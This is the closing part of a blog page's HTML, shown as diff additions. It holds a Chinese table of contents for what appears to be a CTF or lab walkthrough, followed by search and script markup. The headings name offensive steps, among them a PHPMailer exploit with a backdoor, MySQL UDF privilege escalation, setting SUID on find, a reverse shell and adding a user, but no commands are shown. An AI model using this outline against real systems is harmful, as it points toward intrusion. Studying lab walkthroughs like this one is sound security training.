+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-number">2.1.</span> <span class="nav-text">主机发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-number">2.3.</span> <span class="nav-text">目录扫描</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#wpscan"><span class="nav-number">3.1.</span> <span class="nav-text">wpscan</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHPMailer"><span class="nav-number">3.2.</span> <span class="nav-text">PHPMailer</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BF%85%E8%A6%81%E4%BF%AE%E6%94%B9%E5%8F%82%E6%95%B0"><span class="nav-number">3.2.1.</span> <span class="nav-text">必要修改参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E5%90%8E%E7%BB%AD%E6%B5%81%E7%A8%8B"><span class="nav-number">3.2.2.</span> <span class="nav-text">执行后续流程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%91%E5%90%AC%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3"><span class="nav-number">3.2.2.1.</span> <span class="nav-text">监听本地端口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#target"><span class="nav-number">3.2.2.2.</span> <span class="nav-text">target</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#backdoor"><span class="nav-number">3.2.2.3.</span> <span class="nav-text">backdoor</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E4%BC%9A%E8%AF%9D"><span class="nav-number">3.2.2.4.</span> <span class="nav-text">获取会话</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag2"><span class="nav-number">3.3.</span> <span class="nav-text">flag2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag3"><span class="nav-number">3.4.</span> <span class="nav-text">flag3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">4.</span> <span class="nav-text">权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Linpeas-sh%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.1.</span> <span class="nav-text">Linpeas.sh信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#UDF%E6%8F%90%E6%9D%83%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD"><span class="nav-number">4.2.</span> <span class="nav-text">UDF提权条件判断</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%BEmysql%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="nav-number">4.2.1.</span> <span class="nav-text">找mysql账号密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8Bsecure-file-priv%E5%80%BC"><span class="nav-number">4.2.2.</span> <span class="nav-text">查看secure_file_priv值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%98%AF%E5%90%A6%E8%BF%9B%E7%A8%8B%E6%98%AF%E5%90%A6%E4%BB%A5root%E8%BF%90%E8%A1%8C"><span class="nav-number">4.2.3.</span> <span class="nav-text">是否进程是否以root运行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#UDF%E6%8F%90%E6%9D%83"><span class="nav-number">4.3.</span> <span class="nav-text">UDF提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8Bmysql%E6%8F%92%E4%BB%B6%E7%9B%AE%E5%BD%95"><span class="nav-number">4.3.1.</span> <span class="nav-text">查看mysql插件目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E8%AF%91exp"><span class="nav-number">4.3.2.</span> <span class="nav-text">编译exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E9%AB%98%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-number">4.3.3.</span> <span class="nav-text">创建高权限执行命令的函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#do-system%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">4.3.4.</span> <span class="nav-text">do_system利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%99find%E5%91%BD%E4%BB%A4%E6%89%80%E6%9C%89%E8%80%85%E7%9A%84suid%E6%9D%83%E9%99%90"><span class="nav-number">4.3.4.1.</span> <span class="nav-text">给find命令所有者的suid权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">4.3.4.2.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7"><span class="nav-number">4.3.4.3.</span> <span class="nav-text">添加用户</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
